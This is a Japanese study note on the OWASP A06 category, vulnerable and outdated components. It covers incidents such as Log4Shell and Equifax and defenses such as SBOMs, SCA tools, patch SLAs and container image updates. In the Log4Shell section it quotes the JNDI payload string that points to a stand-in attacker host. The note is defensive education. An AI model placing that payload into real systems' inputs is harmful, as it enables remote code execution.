---
tags: [inbox, learning, security]
created: 2026-05-05
aliases:
  - A06
  - Vulnerable and Outdated Components
  - 脆弱なコンポーネント
  - サードパーティ脆弱性
---

# A06 Vulnerable and Outdated Components

> [!summary]
> [[OWASP Top 10]] 2021年版で **6位**。古い／脆弱なライブラリ・OS・ミドルウェアを使い続けることによるリスク。[[Log4Shell]] が象徴例。現代のアプリは依存パッケージ数百〜数千の塊なので、自前コードよりサプライチェーン側の方が攻撃面が広い。**[[SCA]] / [[SBOM]] / [[Dependabot]]** が主要な対策ツール。

## どういう脆弱性か

- **直接依存のメジャーバージョンが古い** — フレームワーク／ランタイム
- **間接依存（推移的依存）に既知CVE** — 自分が直接使っていないが、依存の依存に脆弱性
- **OSパッケージ・コンテナベースイメージが古い**
- **メンテされていないライブラリの利用** — 最終更新が数年前
- **何が入っているか把握していない** — そもそも棚卸しができていない
- **CVEが公表されてもパッチを当てない** — 運用ローテに組み込まれていない

「**コードを書かなければ脆弱性は生まれない**」という時代は終わり、コードを書かなくても依存先に脆弱性があれば刺される。

## 攻撃例

### Log4Shell (CVE-2021-44228)

```
${jndi:ldap://attacker.example/Exploit}
```

これをログに乗せるだけで RCE が成立した。**全業界が「自社にlog4jが入っているか即答できなかった」** ことが業界に深い学びを残した（[[Log4Shell]] 参照）。

### Equifax 流出 (2017)

Apache Struts の CVE-2017-5638（既知の脆弱性）が **2ヶ月以上未パッチ** のまま稼働 → 1.47億件の個人情報流出、和解金 7億ドル超。**「パッチを当てないこと」が最大の脆弱性** という典型例。

### npm event-stream 事件 (2018)

人気ライブラリ `event-stream` のメンテナ権限が悪意ある第三者に譲渡され、暗号通貨ウォレットを狙うコードが混入。何百万ダウンロードに紛れ込んだ（[[サプライチェーン攻撃]] 参照）。

### Spring4Shell (CVE-2022-22965)

Spring Framework の RCE。Log4Shell の数ヶ月後に類似事件、再び業界が棚卸しに追われた。

## 防御策

### 1. 依存パッケージの可視化（[[SBOM]]）

何が入っているかをまず把握する。リリースごとに SBOM を artifact として保存：

- **Syft** で生成（[[Syft]]）
- **CycloneDX** / **SPDX** 形式で保存（[[CycloneDX]] / [[SPDX]]）
- **GitHub Dependency Graph** がデフォルトで生成

### 2. SCA でCVEと突き合わせ

[[SCA]] (Software Composition Analysis) ツールで継続検査：

| ツール | 特徴 |
|---|---|
| **[[Dependabot]]** | GitHub標準、PRを自動作成 |
| **[[Trivy]]** | OSS、コンテナ／IaC／ファイルシステム対応 |
| Snyk | 商用、優先度付け強い |
| GitHub Advanced Security | コード／秘密／依存を統合 |
| Renovate | Dependabot 代替、設定が柔軟 |

### 3. アップデートの自動化

- **Dependabot/Renovate のPRを毎週マージ**するルーチン化
- マイナー／パッチは自動マージ、メジャーは手動レビュー
- CIで testsuite がない依存更新は通さない

### 4. パッチ適用SLAを決める

CVSS スコアやEPSS（Exploit Prediction Scoring System）で優先度付け。例：

| 重大度 | 対応SLA |
|---|---|
| Critical (CVSS 9.0+) | 7日以内 |
| High (CVSS 7.0-8.9) | 30日以内 |
| Medium | 90日以内 |
| Low | ベストエフォート |

公開Web面でexploitが公開されているものは即時。

### 5. メンテナンス状態を採点

依存採用時に：

- 直近1年でコミットがあるか
- メンテナーが複数いるか
- セキュリティレポート窓口があるか
- ダウンロード数推移、Star推移
- ライセンスが許容できるか

代替候補を意識的に評価（OpenSSF Scorecard で自動採点）。

### 6. コンテナベースイメージの選定と継続更新

- distroless / Alpine / Wolfi で攻撃面を小さく
- ベースイメージタグを定期的に更新（`node:20` ではなく具体的なdigest固定 + Renovateで更新）
- イメージ脆弱性スキャンをCIに（[[Trivy]]）

### 7. VEX で「含むが影響なし」を宣言

[[CycloneDX]] の VEX (Vulnerability Exploitability eXchange) で、SBOMに「このCVEは未使用機能なので影響なし」を明記し、無駄なアラートを抑止。

## 検出手段

- **[[SCA]] (Dependabot / Trivy / Snyk)** — 依存パッケージとCVEの突き合わせ
- **[[SBOM]]** — 棚卸しの基盤
- **GitHub Advisory Database** — エコシステム横断のCVEデータベース
- **OpenSSF Scorecard** — メンテナンス品質採点
- **コンテナイメージスキャン** — Trivy / Grype

## 参考事例

- **[[Log4Shell]]** (2021) — 影響規模・対応コストの両面で象徴的
- **Equifax** (2017) — Apache Struts 未パッチで1.47億件流出
- **Codecov** (2021) — Bash Uploader 改ざん（[[A08]]とも関連）
- **xz/liblzma バックドア** (2024) — 国家レベルのサプライチェーン攻撃の長期戦略

## Next.js / Supabase での落とし穴

- **`package-lock.json` 未コミット** — 再現性が崩れ、別マシンで違うバージョンが入る
- **`npm install` でのキャレット（^）** — 自動マイナーアップが本番で予期せぬ挙動を起こす可能性。Lockfileで固定
- **`next` のメジャー更新** — App Router移行など破壊的変更が多い。CI testsuiteを厚く
- **Supabase JS クライアント** — APIキー扱いが変わる更新があるので Changelog を必ず確認

## 関連MOC

- [[MOC Security]]
- [[MOC DevSecOps]]
- [[MOC Learning]]

## 関連ノート

- [[OWASP Top 10]]
- [[Log4Shell]]
- [[サプライチェーン攻撃]]
- [[ソフトウェアサプライチェーン強化]]
- [[Dependabot]]
- [[Trivy]]
- [[SBOM]]
- [[CycloneDX]]
- [[SPDX]]
- [[Syft]]

## 出典

- [OWASP Top 10:2021 A06 Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
- [NIST: SBOM Resources](https://www.cisa.gov/sbom)
- [OpenSSF Scorecard](https://github.com/ossf/scorecard)
